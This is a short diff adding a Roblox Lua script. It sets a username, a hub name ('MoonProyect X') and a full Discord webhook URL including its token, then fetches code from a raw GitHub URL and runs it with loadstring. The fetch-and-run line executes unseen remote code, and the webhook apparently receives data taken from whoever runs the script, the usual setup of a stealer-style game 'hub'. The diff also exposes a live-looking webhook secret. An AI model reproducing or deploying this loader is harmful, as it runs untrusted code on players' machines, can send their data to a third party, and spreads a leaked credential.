@@ -1,0 +1,4 @@
+_G.Username = "nuemiet"
+_G.HubName = "MoonProyect X"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1095834760393261096/AxA4dpSeM4HpU-OPgc0qdp6X0SqEf2JNHSdd0XisIWKLKkUp0xN9BCcYBe1ClD0RTzU9"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoonProyect-x/Proyectx/main/Proyectx"))()
